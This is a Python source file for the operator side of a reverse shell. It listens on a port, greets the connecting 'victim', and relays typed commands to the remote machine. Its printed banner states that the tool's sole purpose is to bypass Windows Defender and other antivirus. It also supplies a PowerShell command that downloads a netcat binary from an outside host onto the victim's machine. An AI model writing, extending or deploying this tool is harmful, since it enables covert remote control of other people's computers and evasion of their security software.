import socket
import threading

R = '\033[31m'
G = '\033[32m'
RESET = '\033[0m'
C = '\033[36m'

port = int(input("Enter port on which you want to listen> "))


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = ""
    s.bind((ip, port))
    s.listen(10)
    print(f"Listening on port {port} ...")

    def receive_and_print(c):
        global path
        while True:
            try:
                try:
                    c.send("#display_path".encode())
                    path = c.recv(1024).decode()

                except ConnectionAbortedError:
                    print(f"{R} The client disconnected!")
                    break

                command = input(f"{path}> ")

                if command == "":
                    continue

                c.send(command.encode("utf-8"))
                response = c.recv(1024)

                if response == " ":
                    continue

                response = response.decode()
                print(response)
            except:
                pass

    c, addr = s.accept()
    print(f"{G}Victim connected: {addr}")
    print()
    print(f"{R}!!!!!! WARNING !!!!!!")
    print(f"{R}This shell is manually written in python by an extremely noob programmer")
    print(f"{R}This shell is very bad and has unlimited bugs and is unusable in many cases")
    print(f"{C}It is suggested to use netcat tool for better shell")
    print(f"{C}You can install netcat in victim's machine with the command given below")
    print(f"{C}powershell -c wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile nc64.exe")
    print(f"{G}The sole motive of this tool is to bypass windows defender and other anti-viruses{RESET}")
    print()

    threading.Thread(target=receive_and_print, args=(c,)).start()

except KeyboardInterrupt:
    exit()
